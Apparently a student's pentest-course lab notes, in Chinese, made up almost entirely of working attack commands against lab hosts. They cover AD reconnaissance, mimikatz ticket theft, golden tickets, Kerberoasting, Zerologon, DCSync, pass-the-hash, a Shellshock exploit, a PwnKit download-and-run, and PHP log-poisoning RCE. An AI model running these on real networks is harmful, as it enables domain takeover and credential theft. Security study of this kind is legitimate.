Day5
===
ADRecon
---
    AD由三個部分組成
    目錄分割區
    設定檔
    Schema資料庫結構
![image](https://github.com/user-attachments/assets/5f241d92-cbbd-4673-9652-2120ee57b018)
![image](https://github.com/user-attachments/assets/2a14572d-8f90-4533-835c-513a9945791e)

    蒐集AD資訊，下載ADRecon工具
[ADRecon工具](https://github.com/adrecon/ADRecon)
![image](https://github.com/user-attachments/assets/b3735d89-1269-4271-a994-8b2bb5b57117)

    執行powershell&ADRecon.ps1
    powershell.exe  -nop –ep bypass
    -nop:PowerShell 在啟動時不讀取任何配置文件，包括使用者配置文件。
    -ep: -ExecutionPolicy Bypass 的簡寫
    > in Domain
    ./adrecon.ps1
    > OR Not in Domain
    ./adrecon.ps1 -DomainController 192.168.177.19 –OutputType ALL -Credential lpt.com\cpent
    > OR
    ./adrecon.ps1 -DomainController 192.168.177.19 –OutputType HTML -Credential lpt.com\cpent
![image](https://github.com/user-attachments/assets/63813ab0-0e04-42ef-8f18-86b36605c65a)
![image](https://github.com/user-attachments/assets/12ddffa2-2bf4-4b03-871f-b53ef80c8687)

Export Kerberos Tickets
---
    使用mimikatz工具
    mimikatz
    privilege::debug
    sekurlsa::tickets /export
![image](https://github.com/user-attachments/assets/325d960d-dbe1-4dd5-8533-3b9b4fa6ccc9)
![image](https://github.com/user-attachments/assets/cf574c3d-244b-4dfa-a7aa-77905f6e0438)

Pass the Ticket
---
    取得DC TGT拿到另外一台機器匯入TGT，尚未匯入前無法訪問DC目錄
![image](https://github.com/user-attachments/assets/c244175e-bf04-4d54-a842-4f2171abf30e)
![image](https://github.com/user-attachments/assets/e83a042a-4223-4460-94ca-d4426c83289c)

    匯入TGT&確認票卷
![image](https://github.com/user-attachments/assets/4a8cfc5b-0cb2-4156-a80b-6cd23f8faf35)
![image](https://github.com/user-attachments/assets/57868c45-8eb9-4959-aa94-31a1371981d5)

    可瀏覽DC目錄
![image](https://github.com/user-attachments/assets/1495a602-6c57-4ff2-a1a8-67af5b4b1227)

Golden Ticket Attack
---
    /etc/hosts新增IP&域名
![image](https://github.com/user-attachments/assets/cd32ab86-fca6-447e-bda6-ede7ce144113)

    取得administrator的krbtgt的NTLM hash
    impacket-secretsdump 'administrator:Pa$$w0rd'@192.168.177.19    
![image](https://github.com/user-attachments/assets/164b2a01-4163-4cef-a8db-4f4b19f663a5)

    取得administrator的SID
    python3 /opt/impacket/examples/lookupsid.py 'administrator:Pa$$w0rd'@192.168.177.19 0
![image](https://github.com/user-attachments/assets/3ec80a6d-4cce-406a-84af-28f25dff7e05)

    簽一張TGT
    python3 /opt/impacket/examples/ticketer.py -nthash <ntlm_hash> -domain-sid <sid> -domain lpt.com evil
![image](https://github.com/user-attachments/assets/1e063263-9b10-4248-8545-09fb0828fe89)

    設定環境變數
    export KRB5CCNAME=~/evil.ccache
![image](https://github.com/user-attachments/assets/dd1603e6-c95a-48ae-8f2f-cfbf5f806cb8)

    執行RCE
    psexec.py lpt.com/evil@server2019.lpt.com -k -no-pass -dc-ip 192.168.177.19
![image](https://github.com/user-attachments/assets/afa4eab9-d9e7-4603-8c33-c7708c096562)

Kerberoasting
---
    Register service in AD
    setspn -s http/lpt.com user-one
![image](https://github.com/user-attachments/assets/fbca5919-1e5d-4a1f-9fff-c59e2e07dcd5)
  
    取得在DC上註冊的服務&密碼HASH
    GetUserSPNs.py 'lpt.com/cpent:Pa$$w0rd' -dc-ip 192.168.177.19 -request -outputfile kerberoast.txt
![image](https://github.com/user-attachments/assets/f4ca12aa-9f57-4d1d-a892-6f0576e95622)
![image](https://github.com/user-attachments/assets/eceb82db-8e93-47f4-a09f-5f5c7a76c27b)

    使用john破解user-one密碼
![image](https://github.com/user-attachments/assets/cad67771-346f-4b44-83af-8625d293407f)

Zerologon
---
    下載新版mimikatz
 [mimikatz](https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20220919)
![image](https://github.com/user-attachments/assets/c1213384-fed5-4171-ad7b-a0fd068dc5ad)

    執行mimikatz並dump
    lsadump::Zerologon /target:192.168.177.19 /account:server2019$ /null /ntlm /exploit
    lsadump::postzerologon /target:192.168.177.19 /account:server2019$
![image](https://github.com/user-attachments/assets/07bd99c9-3e5b-417a-b4ce-33f5628990bd)
dcsync
---
    lsadump::dcsync /authdomain:lpt /authuser:server2019$ /authpassword:"" /authntlm /domain:lpt.com /dc:server2019 /user:administrator
    lsadump::dcsync /authdomain:lpt /authuser:server2019$ /authpassword:"" /authntlm /domain:lpt.com /dc:server2019 /user:krbtgt
![image](https://github.com/user-attachments/assets/bf3b892f-5ffd-4cff-a30c-fb63a3ff9ad6)

    目前連到不到DC目錄
![image](https://github.com/user-attachments/assets/a610b8aa-ff61-405c-92c0-cded3b11437a)

PtH
---
    privilege::debug
    sekurlsa::pth /user:Administrator /domain:server2019.lpt.com /ntlm:<HASH>
![image](https://github.com/user-attachments/assets/1c8478f2-e11e-45ed-803f-27cb5c239fd7)
![image](https://github.com/user-attachments/assets/b00c5da9-30d3-4d09-82f2-23fa015fb745)

PtT
---
    取得krbtgt的NTLM HASH&SID
    kerberos::golden /domain:lpt.com /sid:<SID> /krbtgt:<HASH> /user:evil /ptt
    misc::cmd
    klist add_bind lpt.com server2019.lpt.com 
    kerberos::golden /domain:lpt.com /sid:<SID> /krbtgt:<HASH> /user:evil /ticket:evil.tck
![image](https://github.com/user-attachments/assets/24f1ebad-a84c-4a3a-a530-a711c97a9dfe)

SHELLSHOCK
---
    Preparation on 192.168.0.24:
    cd /usr/lib/cgi-bin/
    sudo cp shellshock keygen
![image](https://github.com/user-attachments/assets/54fc6039-d50f-41fd-a041-3550317af3b4)

    Parrot:
    dirb http://192.168.0.24
    dirb http://192.168.0.24/cgi-bin
![image](https://github.com/user-attachments/assets/f204f99d-7037-4c23-a3ba-4f2a83d00deb)
![image](https://github.com/user-attachments/assets/c6e7b513-24e3-421d-9769-fbd7892ae987)

    msfconsole
    search shellshock
    use exploit/multi/http/apache_mod_cgi_bash_env_exec
    show options
    set RHOSTS 192.168.0.24
    set RPORT 80
    set TARGETURI /cgi-bin/keygen
    shell
    script /dev/null -qc /bin/bash
    利用PwnKit提權
    python3 -m http.server 8888
    wget http://192.168.0.18:8888/PwnKit32
    chmod +x PwnKit32
    ./PwnKit32
[PwnKit](https://github.com/ly4k/PwnKit)
![image](https://github.com/user-attachments/assets/9242b59d-f2a8-4ee5-95d7-43a14b314eaf)
![image](https://github.com/user-attachments/assets/f5aadc76-536d-4003-b29f-13dc4ea1b0a9)
![image](https://github.com/user-attachments/assets/e6b7dfcf-ba6c-4908-afab-b2f93be10dfb)


LFI to RCE
---
    ssh administrator@192.168.0.10
    toor
    echo '<?php phpinfo(); ?>' >> /var/www/html/info.php
    echo '<?php include($_GET["file"]); ?>' >> /var/www/html/inc.php
    # Parrot:
    http://192.168.0.10/inc.php?file=info.php
![image](https://github.com/user-attachments/assets/28387bd5-ca33-4eaf-8dcf-29e56f688407)
![image](https://github.com/user-attachments/assets/a8db145f-bb93-4ce9-946f-243730f1366f)

    chmod 775 -R /var/log/apache2
    http://192.168.0.10/inc.php?file=/var/log/apache2/access.log
![image](https://github.com/user-attachments/assets/47c38770-b16b-4a50-b8d2-99d7971ef85e)
![image](https://github.com/user-attachments/assets/81448441-ee04-4833-9858-d7ec699f282c)

    變更user-agent
    <?php system($_GET[1])?>
![image](https://github.com/user-attachments/assets/adfbbf8e-39f5-4a64-9de4-791084eaffe3)
![image](https://github.com/user-attachments/assets/a75a0457-b4ef-4508-88ec-be8720d28772)